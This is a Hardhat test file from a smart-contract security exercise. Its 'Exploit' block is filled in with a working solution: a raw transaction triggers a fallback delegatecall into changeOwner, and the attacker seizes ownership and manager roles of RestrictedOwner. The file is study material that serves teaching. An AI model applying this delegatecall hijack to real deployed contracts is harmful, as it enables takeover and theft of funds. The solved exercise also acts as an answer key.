const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Calls Attacks Exercise 1', function () {

    let deployer, user, attacker;

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user, attacker] = await ethers.getSigners();

        // Deploy
        const UnrestrictedOwnerFactory = await ethers.getContractFactory(
            'contracts/call-attacks-1/UnrestrictedOwner.sol:UnrestrictedOwner',
            deployer
        );
        this.unrestrictedOwner = await UnrestrictedOwnerFactory.deploy();
        const RestrictedOwnerFactory = await ethers.getContractFactory(
            'contracts/call-attacks-1/RestrictedOwner.sol:RestrictedOwner',
            deployer
        );
        this.restrictedOwner = await RestrictedOwnerFactory.deploy(this.unrestrictedOwner.address);
        
        // Any user can take ownership on `UnrestrictedOwner` contract
        await expect(this.unrestrictedOwner.connect(user).changeOwner(user.address)).not.to.be.reverted;
        expect(await this.unrestrictedOwner.owner()).to.equal(user.address);

        // Any user can't take ownership on `RestrictedOwner` contract
        expect(this.restrictedOwner.connect(user).updateSettings(user.address, user.address)).to.be.reverted;
        expect(await this.restrictedOwner.owner()).to.equal(deployer.address);
        expect(await this.restrictedOwner.manager()).to.equal(deployer.address);
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */

        // We want to trigger the fallback function in the RestrictedOwner.sol contract
        // Execute the delegateCall to the "changeOwner(address _newOwner)" function
        // Send the _newOwner = attacker's address
        // Call the updateSettings function to update the manager
        
        let iface = new ethers.utils.Interface([
            "function changeOwner(address _newOwner)"
        ]);
        const data = iface.encodeFunctionData(`changeOwner`, [attacker.address])
        let tx = await attacker.sendTransaction({
            from: attacker.address,
            to: this.restrictedOwner.address,
            data
        })

        await this.restrictedOwner.connect(attacker).updateSettings(attacker.address, attacker.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Attacker should take ownership on `RestrictedOwner` contract
        expect(await this.restrictedOwner.owner()).to.equal(attacker.address);
        expect(await this.restrictedOwner.manager()).to.equal(attacker.address);
    });
});
